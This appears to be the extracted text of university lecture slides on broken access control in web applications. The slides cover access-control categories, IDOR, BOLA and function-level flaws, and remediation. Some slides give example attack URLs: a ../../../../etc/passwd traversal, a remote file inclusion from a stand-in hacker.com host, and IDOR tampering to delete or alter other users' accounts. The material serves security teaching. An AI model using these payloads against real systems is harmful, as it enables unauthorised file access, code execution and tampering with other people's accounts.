@@ -1,0 +1,592 @@
+--- Page 1 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Web Application: Broken
+Access Control
+By: Dr. Khairunnisa bt Osman
+Subject: Software Security (CCSB5133)
+Sem 2 (2025/2026)
+
+--- Page 2 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Agenda I
+✓What is Access Control?
+✓Access Control Categories
+• Vertical Access Control
+• Horizontal Access
+Control
+• Context-dependant
+Access Control
+✓Common Attacks
+• Access to Admin Page
+• Directory Traversal File
+• Phishing
+• Spoofing
+
+--- Page 3 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Agenda II
+✓Real-World Scenarios
+• IDOR
+• BOLA
+• MFLAC
+• BFLA
+✓Remediation Guidelines &
+Authorization Security
+
+--- Page 4 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+What is access control?
+• Access control (or authorization) is the application of constraints
+on who (or what) can perform attempted actions or access
+resources that they have requested.
+• In the context of web applications, access control is dependent
+on authentication and session management:
+
+--- Page 5 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Continue
+• Authentication identifies the
+user and confirms that they
+are who.
+• Session management
+identifies which subsequent
+HTTP requests are being
+made by that same user.
+• Access control determines
+whether the user is allowed
+to carry out the action that
+they are attempting to
+perform.
+
+--- Page 6 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Broken Access Control
+Design and management of access controls is a complex and
+dynamic problem that applies business, organizational to a
+technical implementation.
+Common weaknesses that invites the access control’s attacks
+• Lack of proper authentication
+• Weak passwords
+• Insufficient authorization
+• Lack of auditing
+
+--- Page 7 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Access Controls Categories
+1.Vertical access controls
+2.Horizontal access
+controls
+3.Context-dependent
+access controls
+
+--- Page 8 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Vertical access controls I
+• Vertical access controls refer to access controls that are
+applied to different levels of an organization or system
+hierarchy.
+• This means that access controls are implemented at different
+levels, and users are granted or denied access based on their
+role or level of authority within the organization or system.
+
+--- Page 9 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Vertical access controls II
+
+--- Page 10 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Vertical access controls III
+The figure above shows that admin users can reach resources
+and functions that require admin privileges and regular users
+can reach resources and functions which require users’
+privileges. However, users cannot reach resources and functions
+that require admin privileges due to the vertical access control.
+
+--- Page 11 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Horizontal access controls
+• Horizontal access controls refer to access controls that are
+applied across different users or entities at the same level
+within an organization or system hierarchy.
+• This means that access controls are implemented based on
+specific attributes or characteristics of the user, rather than
+their position or level of authority within the organization or
+system.
+
+--- Page 12 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Horizontal access controls I
+
+--- Page 13 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Horizontal access controls II
+According to the figure above, each user can reach their
+resources and actions. However, they cannot reach each
+other’s resources and actions although they are in the same
+privilege level as regular users. This is horizontal access control.
+
+--- Page 14 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Context-dependent access controls
+• Context-dependent access controls are access controls that
+are applied based on specific contextual factors, such as
+location, time, device, or network.
+• These controls take into consideration the specific
+environment in which a user is accessing resources and
+adjust access permissions accordingly.
+
+--- Page 15 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Context-dependent access controls I
+
+--- Page 16 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Context-dependent access controls II
+• The example scenario in Figure 4 is that the e-commerce website
+should prevent users from modifying the contents of their
+shopping cart after they have made a payment.
+• This can be also defined as a business logic error related to
+broken access control. Here, the user adds items into his cart and
+completes payment. However, he cannot change the items in his
+cart after payment because context-dependent access control does
+not allow him to perform actions in the wrong order.
+
+--- Page 17 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Common Attacks
+• Access to Admin Pages
+• Directory Traversal File Include
+• Local File Inclusion (LFI)
+• Remote File Inclusion (RFI)
+• Spoofing
+• Phishing
+
+--- Page 18 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Common Attacks: Access to Admin
+Pages
+• Administrative functions should be linked from an
+administrator’s welcome page but not from a user’s welcome
+page.
+• However, a user might to access the administrative functions
+by browsing directly to the relevant admin URL.
+• https://target.com/admin
+• https://target.com/administrator
+• https://target.com/web_admin
+• Access to admin pages where sensitive functions take place
+generally results in vertical privilege escalation.
+
+--- Page 19 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Common Attacks: Directory Traversal
+File Include
+• Using input validation methods that have not been well designed
+or deployed, an aggressor could exploit the system to read or
+write files that are not intended to be accessible.
+• Access Control Lists (ACL) identifies which users or groups are
+supposed to be able to access, modify, or execute a specific file on
+the server.
+• ACL designed to prevent malicious users from accessing sensitive
+files.
+
+--- Page 20 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Common Attacks: Directory Traversal
+File Include I
+
+--- Page 21 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Common Attacks: Directory Traversal
+File Include II
+Local File Inclusion (LFI)
+LFI occurs when a web application allows a user to include a
+local file, such as a configuration file or password file, by
+specifying a path to the file in a parameter of the web request.
+The attacker may use ".." to navigate up the directory structure
+and access files outside of the application's root directory.
+
+--- Page 22 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Common Attacks: Directory Traversal
+File Include III
+Local File Inclusion (LFI)
+• In the example given, the attacker is attempting to access the
+password file on the system by navigating up to the etc.
+directory using "..".
+• This vulnerability can allow an attacker to read sensitive data
+or execute arbitrary code on the server.
+• http://example.com/getUserProfile.jsp?item=../../../../etc/pa
+sswd
+
+--- Page 23 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Common Attacks: Directory Traversal
+File Include IV
+Remote File Inclusion (RFI)
+RFI occurs when a web application includes a file from a
+remote server specified in a parameter of the web request.
+The attacker may craft a malicious URL that points to a file
+hosted on their own server, which is then included by the
+vulnerable application.
+
+--- Page 24 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Common Attacks: Directory Traversal
+File Include V
+Remote File Inclusion (RFI)
+• In the example given, the attacker is attempting to include a
+malicious file hosted on their own server, which can allow
+attacker to execute arbitrary code on the server.
+• http://example.com/index.php?file=http://hacker.com/malici
+ous.txt
+
+--- Page 25 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Common Attacks: Phishing
+Phishing is a type of online scam where attackers
+pretend to be a trustworthy entity, such as a bank or
+email provider, in order to trick victims into giving
+them sensitive information like passwords or credit
+card numbers.
+
+--- Page 26 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Common Attacks: Phishing I
+Types of Phishing
+
+--- Page 27 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Common Attacks: Spoofing
+Spoofing is a technique used by cyber criminals to deceive
+individuals or computer systems by falsifying information to
+appear as though it came from a trustworthy source.
+This can include falsifying email addresses, IP addresses, or
+websites to make them appear legitimate.
+The goal of spoofing attacks is often to gain access to sensitive
+information or to trick individuals into taking a specific action.
+
+--- Page 28 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Common Attacks: Spoofing I
+Types of Spoofing
+
+--- Page 29 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Differences: Spoofing & Phishing
+
+--- Page 30 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Real-World Scenarios
+• Insecure Direct Object Reference (IDOR)
+• Broken Object Level Authorisation (BOLA)
+• Missing Function Level Access Control (MFLAC)
+• Broken Function Level Authorisation (BFLA)
+
+--- Page 31 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Real-World Scenarios: Insecure Direct
+Object Reference (IDOR)
+• Insecure Direct Object References (IDOR) occur
+when an application provides direct access to
+objects based on user-supplied input, such as an ID
+or a key.
+• As a result of this vulnerability, attackers can bypass
+authorization and access resources in the system
+directly, for example, database records or files.
+
+--- Page 32 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Real-World Scenarios: Insecure Direct
+Object Reference (IDOR) I
+• Assume that there is an e-commerce application, and we are
+expected to see only our cart. However, some missing access
+controls can give us access to other users’ carts.
+• Log into your account and go to see your cart. For example,
+https://target.com/viewCart.php?userID=1234
+• The application has a user ID on a URL parameter. Let’s tamper
+with it.
+• https://target.com/viewCart.php?userID=5678
+
+--- Page 33 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Real-World Scenarios: Insecure Direct
+Object Reference (IDOR) II
+• If you can see the cart of the user whose user ID is 5678, then
+there is an Insecure Direct Object Reference vulnerability.
+• Since the application is vulnerable to IDOR, you can carry out
+further attacks with more impact such as changing address,
+changing payment method, deleting the account, and so on.
+• https://target.com/deleteAccount.php?userID=5678
+• https://target.com/changeAddress.php?userID=5678
+
+--- Page 34 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Real-World Scenarios: Broken Object
+Level Authorisation (BOLA)
+• The logic behind Broken Object Level Authorisation (BOLA)
+and IDOR are the same. Therefore, we can define BOLA as
+“IDOR in APIs”.
+• APIs tend to expose endpoints that handle object identifiers,
+creating a wide attack surface Level Access Control issue.
+Object-level authorization checks should be considered in
+every function that accesses a data source using input from
+the user.
+
+--- Page 35 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Real-World Scenarios: Broken Object
+Level Authorisation (BOLA) I
+• Assume you identified target.com uses an API to access data
+and interact with external software components, operating
+systems, or microservices.
+• Sign into your account and navigate to the “User
+Information” page.
+• You realized that the application fetches user information
+from an external service via a GET request as seen on the
+next page.
+
+--- Page 36 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Real-World Scenarios: Broken Object
+Level Authorisation (BOLA) II
+• If BOLA exists, you can fetch other user’s data by
+tampering with only User ID. This results in sensitive
+information disclosure.
+
+--- Page 37 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Real-World Scenarios: Missing Function
+Level Access Control (MFLAC)
+• Web applications should verify function-level access
+rights for all requested actions by any user .
+• If checks are not performed and enforced,
+malicious users may be able to penetrate critical
+areas of a web application without proper
+authorization.
+
+--- Page 38 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Real-World Scenarios: Missing Function
+Level Access Control (MFLAC) I
+• Assume that an application allows users to edit their
+accounts, user information with a request shown below but,
+users are not allowed to delete their accounts.
+
+--- Page 39 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Real-World Scenarios: Missing Function
+Level Access Control (MFLAC) II
+• What if a user wants to delete his account instead of editing?
+Investigate the request below.
+• When this request succeeds in deleting the user account, it
+means any user can abuse the function which is not
+presented to users in the front-end. This is because of Missing
+Function Level Access Control.
+
+--- Page 40 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Real-World Scenarios: Broken Function
+Level Authorization (BFLA)
+• Complex access control policies with different
+hierarchies, groups, and roles, and an unclear
+separation between administrative and regular
+functions, tend to lead to authorization flaws.
+• By exploiting these issues, attackers gain access to
+other users’ resources and/or administrative
+functions.
+
+--- Page 41 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Real-World Scenarios: Broken Function
+Level Authorization (BFLA) I
+• Suppose that an application triggers API calls to fetch user
+information. Examine the following request-response cycles.
+
+--- Page 42 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Real-World Scenarios: Broken Function
+Level Authorization (BFLA) II
+• Let’s intercept the request and tamper with the API
+call.
+
+--- Page 43 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Real-World Scenarios: Broken Function
+Level Authorization (BFLA) III
+• API calls (requests) may vary, but the logic behind
+the action is the same. For example;
+
+--- Page 44 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Remediation Guidelines
+• Access control vulnerabilities cannot be prevented by
+applying a single formula or simple, ordinary and common
+checks because; access rights, permissions, principles, and
+other factors often vary due to the differences in context,
+workflow, and purpose of the applications.
+
+--- Page 45 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Authorization Security
+• Do Not Rely on Obfuscation
+• Deny Access by Default
+• Single Application-Wide Mechanism (consistent for all
+modules)
+• Continuous Audit and Test Access Control
+• Minimize CORS (Cross-Origin Resource Sharing) Usage
+• Web page can only make requests to the same domain it was loaded from
+(this is called the Same-Origin Policy).
+
+--- Page 46 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Authorization Security I
+• Disable Web Server Directory Listing
+• Log & Alert
+• Rate Limit API
+• Force All Requests to Go Through Access Control Checks
+• Give As Least or As Little Necessary Access as Possible
+
+--- Page 47 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+End
